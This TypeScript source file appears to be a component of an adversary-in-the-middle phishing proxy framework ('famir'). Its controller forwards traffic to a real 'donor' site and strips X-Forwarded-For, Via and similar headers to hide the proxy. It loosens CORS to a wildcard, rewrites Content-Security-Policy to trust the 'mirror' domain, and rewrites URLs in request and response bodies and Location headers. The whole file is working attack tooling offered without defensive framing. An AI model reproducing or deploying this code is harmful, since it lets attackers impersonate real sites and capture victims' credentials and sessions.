import { DIContainer } from '@famir/common'
import { HTTP_SERVER_ROUTER, HttpServerRouter } from '@famir/http-server'
import { Logger, LOGGER } from '@famir/logger'
import { Validator, VALIDATOR } from '@famir/validator'
import { BaseController } from '../base/index.js'

export const TRANSFORM_CONTROLLER = Symbol('TransformController')

export class TransformController extends BaseController {
  static inject(container: DIContainer) {
    container.registerSingleton(
      TRANSFORM_CONTROLLER,
      (c) =>
        new TransformController(
          c.resolve<Validator>(VALIDATOR),
          c.resolve<Logger>(LOGGER),
          c.resolve<HttpServerRouter>(HTTP_SERVER_ROUTER)
        )
    )
  }

  static resolve(container: DIContainer): TransformController {
    return container.resolve(TRANSFORM_CONTROLLER)
  }

  constructor(validator: Validator, logger: Logger, router: HttpServerRouter) {
    super(validator, logger, router)

    this.logger.debug(`TransformController initialized`)
  }

  useAll() {
    this.useBasic()
    this.useFixCors()
    this.useFixCsp()
    this.useRewriteUrl()
  }

  useBasic() {
    this.router.register('transform-basic', async (ctx, next) => {
      const campaign = this.getState(ctx, 'campaign')
      const target = this.getState(ctx, 'target')
      const message = this.getState(ctx, 'message')

      message.addRequestHeadInterceptor('transform-basic', () => {
        message.url.merge({
          protocol: target.donorProtocol,
          hostname: target.donorHostname,
          port: target.donorPort.toString()
        })

        message.requestHeaders.set('Host', target.donorHost)

        const cookies = message.requestHeaders.getCookies()
        if (cookies) {
          cookies[campaign.sessionCookieName] = undefined
          message.requestHeaders.setCookies(cookies)
        }

        //if (message.requestHeaders.has('Upgrade-Insecure-Requests')) {
        //  if (!target.mirrorSecure) {
        //    message.requestHeaders.delete('Upgrade-Insecure-Requests')
        //  }
        //}

        message.requestHeaders.delete([
          'Via',
          'X-Real-Ip',
          'X-Forwarded-For',
          'X-Forwarded-Host',
          'X-Forwarded-Proto',
          'X-Famir-Campaign-Id',
          'X-Famir-Target-Id'
          // ...
        ])
      })

      message.addResponseHeadInterceptor('transform-basic', () => {
        message.responseHeaders.delete([
          'Proxy-Agent'
          // ...
        ])
      })

      await next()
    })
  }

  useFixCors() {
    this.router.register('transform-fix-cors', async (ctx, next) => {
      const campaign = this.getState(ctx, 'campaign')
      const target = this.getState(ctx, 'target')
      const message = this.getState(ctx, 'message')

      message.addRequestHeadInterceptor('transform-fix-cors', () => {
        if (message.requestHeaders.has('Origin')) {
          const donorOrigin = [target.donorProtocol, '//', target.donorHost].join('')

          message.requestHeaders.set('Origin', donorOrigin)
        }
      })

      message.addResponseHeadInterceptor('transform-fix-cors', () => {
        if (message.responseHeaders.has('Access-Control-Allow-Origin')) {
          message.responseHeaders.set('Access-Control-Allow-Origin', '*')
        }
      })

      await next()
    })
  }

  useFixCsp() {
    this.router.register('transform-fix-csp', async (ctx, next) => {
      const campaign = this.getState(ctx, 'campaign')
      const target = this.getState(ctx, 'target')
      const message = this.getState(ctx, 'message')

      message.addResponseHeadInterceptor('transform-fix-csp', () => {
        if (message.responseHeaders.has('Content-Security-Policy')) {
          message.responseHeaders.set(
            'Content-Security-Policy',
            `default-src 'self' *.${target.mirrorDomain} ${target.mirrorDomain};`
          )
        }

        if (message.responseHeaders.has('Permissions-Policy')) {
          message.responseHeaders.delete('Permissions-Policy')
        }
      })

      await next()
    })
  }

  useRewriteUrl() {
    this.router.register('transform-rewrite-url', async (ctx, next) => {
      const campaign = this.getState(ctx, 'campaign')
      const target = this.getState(ctx, 'target')
      const targets = this.getState(ctx, 'targets')
      const message = this.getState(ctx, 'message')

      message.addRequestBodyInterceptor('transform-rewrite-url', () => {
        const contentType = message.requestHeaders.getContentType()
        if (contentType && message.isRewriteUrlType(contentType)) {
          const charset = contentType.parameters['charset']
          const fromText = message.requestBody.getText(charset)
          if (fromText) {
            const toText = message.rewriteUrl(fromText, true, targets)
            message.requestBody.setText(toText)

            message.requestHeaders.set('Content-Length', message.requestBody.length.toString())
          }
        }
      })

      message.addResponseHeadInterceptor('transform-rewrite-url', () => {
        const absoluteUrlRegExp = /^https?:\/\/|^\/\//i
        if (message.responseHeaders.has('Location')) {
          const fromValue = message.responseHeaders.getString('Location')
          if (fromValue && absoluteUrlRegExp.test(fromValue)) {
            const toValue = message.rewriteUrl(fromValue.toLowerCase(), false, targets)
            message.responseHeaders.set('Location', toValue)
          }
        }
      })

      message.addResponseBodyInterceptor('transform-rewrite-url', () => {
        const contentType = message.responseHeaders.getContentType()
        if (contentType && message.isRewriteUrlType(contentType)) {
          const charset = contentType.parameters['charset']
          const fromText = message.responseBody.getText(charset)
          if (fromText) {
            const toText = message.rewriteUrl(fromText, false, targets)
            message.responseBody.setText(toText)

            message.responseHeaders.set('Content-Length', message.responseBody.length.toString())
          }
        }
      })

      await next()
    })
  }
}
